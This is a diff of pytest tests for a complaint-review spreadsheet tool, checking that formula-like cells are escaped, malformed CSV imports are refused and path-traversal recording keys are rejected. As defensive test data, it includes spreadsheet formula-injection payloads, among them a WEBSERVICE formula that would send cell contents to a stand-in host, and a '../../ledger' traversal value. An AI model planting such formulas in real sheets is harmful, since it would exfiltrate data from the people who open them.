@@ -1192,3 +1192,139 @@ def test_V7_the_sheets_hold_only_development_ids_from_their_lists(tmp_path, fake
         assert cli.main(["review", "sheet", piece], env={}, root=root) == 0
         assert {r["complaint_id"] for r in _read_sheet(review.sheet_path(piece))} <= dev
     capsys.readouterr()
+
+
+# Review of #73.
+
+@pytest.mark.parametrize("value, shown", [
+    ("=HYPERLINK(\"http://example.invalid\")", "'=HYPERLINK(\"http://example.invalid\")"),
+    ("+1", "'+1"), ("-2 dollars", "'-2 dollars"), ("@SUM(A1)", "'@SUM(A1)"), ("\tx", "'\tx"), ("\rx", "'\rx"),
+    ("SYN plain text", "SYN plain text"), ("", ""),
+])
+def test_V8_a_cell_a_spreadsheet_would_run_as_a_formula_is_shown_as_text(value, shown):
+    from voc import review
+    assert review.safe_cell(value) == shown
+
+
+def test_V8_the_sheet_writes_formula_like_cells_as_text_and_the_import_still_reads_the_codes(tmp_path, fake_home,
+                                                                                            capsys, monkeypatch):
+    from voc import cli, review
+    root, dev, _ = _sheet_project(tmp_path)
+    real = review.sheet_rows
+
+    def hostile(root_, piece):
+        rows = real(root_, piece)
+        for row in rows:
+            row["complaint_text"] = "=WEBSERVICE(\"http://example.invalid/\"&A1) SYN"
+            row["llm_quote"] = "+SYN quote"
+        return rows
+
+    monkeypatch.setattr(review, "sheet_rows", hostile)
+    assert cli.main(["review", "sheet", "v2"], env={}, root=root) == 0
+    rows = _read_sheet(review.sheet_path("v2"))
+    assert all(r["complaint_text"].startswith("'=") and r["llm_quote"].startswith("'+") for r in rows)
+    _fill(review.sheet_path("v2"), ["llm_right", "unclear"])
+    assert cli.main(["review", "import", "v2"], env={}, root=root) == 0
+    capsys.readouterr()
+
+
+def test_V8_B21_a_refusal_never_prints_a_value_that_is_not_an_id(tmp_path, fake_home, capsys):
+    from voc import cli, review
+    root, dev, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v2"], env={}, root=root) == 0
+    path = review.sheet_path("v2")
+    _fill(path, ["llm_right", "unclear"])
+    text = path.read_bytes().decode("utf-8-sig")
+    path.write_bytes(text.replace(dev[1].complaint_id + ",", "SYN narrative words that slid into the ID column,", 1)
+                     .encode("utf-8"))
+    assert cli.main(["review", "import", "v2"], env={}, root=root) == 1
+    printed = capsys.readouterr().out
+    assert "narrative words" not in printed
+    assert "row 2" in printed
+
+
+def _quarantine(reason, key):
+    return {"complaint_id": "SYN-1", "reason": reason, "recording_key": key}
+
+
+def test_V3_a_quarantine_with_no_call_or_no_usable_answer_says_so_and_does_not_stop_the_sheet(fake_home):
+    import json
+    from voc import review
+    from voc.replay import recordings_dir
+    recordings_dir().mkdir(parents=True)
+    unparseable_key, missing_key = "a" * 64, "b" * 64
+    (recordings_dir() / f"{unparseable_key}.json").write_text(json.dumps({"key": unparseable_key, "text": "no json"}),
+                                                             encoding="utf-8")
+    for reason, key in (("no_narrative", ""), ("not_run_budget", ""), ("model_error", missing_key),
+                        ("model_error", unparseable_key)):
+        label, quote = review._proposed_answer(REPO, _quarantine(reason, key))
+        assert label.startswith("(") and quote.startswith("("), (reason, key)
+
+
+def test_V3_a_recording_key_that_is_not_a_hash_is_refused(fake_home):
+    from voc import review
+    with pytest.raises(review.ReviewError) as refused:
+        review._proposed_answer(REPO, _quarantine("quote_not_in_text", "../../ledger"))
+    assert "recording key" in str(refused.value)
+
+
+def test_V2_the_import_reads_a_sheet_saved_in_the_windows_code_page_with_a_renamed_header_and_extra_columns(
+        tmp_path, fake_home, capsys):
+    import csv
+    import io
+    from voc import cli, review
+    root, dev, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v2"], env={}, root=root) == 0
+    path = review.sheet_path("v2")
+    rows = _read_sheet(path)
+    out = io.StringIO()
+    writer = csv.writer(out, lineterminator="\r\n")
+    writer.writerow(["Complaint_ID ", "consumer_choice", "my note", " Code"])
+    for row, code in zip(rows, ["llm_right", "consumer_right"]):
+        writer.writerow([row["complaint_id"], row["consumer_choice"], "café", code])
+    path.write_bytes(out.getvalue().encode("cp1252") + b"\x81")
+    assert cli.main(["review", "import", "v2"], env={}, root=root) == 0
+    assert "llm_right: 1" in capsys.readouterr().out
+
+
+def test_V2_a_sheet_saved_with_semicolons_is_refused_with_a_clear_message(tmp_path, fake_home, capsys):
+    from voc import cli, review
+    root, dev, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v2"], env={}, root=root) == 0
+    path = review.sheet_path("v2")
+    path.write_text("complaint_id;code\n" + "".join(f"{r.complaint_id};unclear\n" for r in dev[:2]), encoding="utf-8")
+    assert cli.main(["review", "import", "v2"], env={}, root=root) == 1
+    assert "comma" in capsys.readouterr().out
+
+
+@pytest.mark.parametrize("change", ["blank", "unknown_code"])
+def test_V3_a_bad_v3_sheet_is_refused_and_nothing_is_written(tmp_path, fake_home, capsys, change):
+    from voc import cli, review
+    root, _, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v3"], env={}, root=root) == 0
+    _fill(review.sheet_path("v3"), ["check_right", "check_wrong", "" if change == "blank" else "llm_right"])
+    assert cli.main(["review", "import", "v3"], env={}, root=root) == 1
+    assert not (root / "results" / "validation" / "v3_codes.csv").exists()
+    capsys.readouterr()
+
+
+def test_V8_the_printed_sheet_path_does_not_show_the_home_folder(tmp_path, fake_home, capsys):
+    from voc import cli
+    root, _, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v2"], env={}, root=root) == 0
+    printed = capsys.readouterr().out
+    assert "~/.voc/review/v2_sheet.csv" in printed
+    assert str(fake_home) not in printed
+
+
+def test_V3_the_v3_printout_lists_each_id_with_its_reason_and_code(tmp_path, fake_home, capsys):
+    from voc import cli, review
+    root, dev, _ = _sheet_project(tmp_path)
+    assert cli.main(["review", "sheet", "v3"], env={}, root=root) == 0
+    rows = _read_sheet(review.sheet_path("v3"))
+    _fill(review.sheet_path("v3"), ["check_right", "check_wrong", "unclear"])
+    capsys.readouterr()
+    assert cli.main(["review", "import", "v3"], env={}, root=root) == 0
+    printed = capsys.readouterr().out
+    for row, code in zip(rows, ["check_right", "check_wrong", "unclear"]):
+        assert f"{row['complaint_id']}: {row['reason']}, {code}" in printed
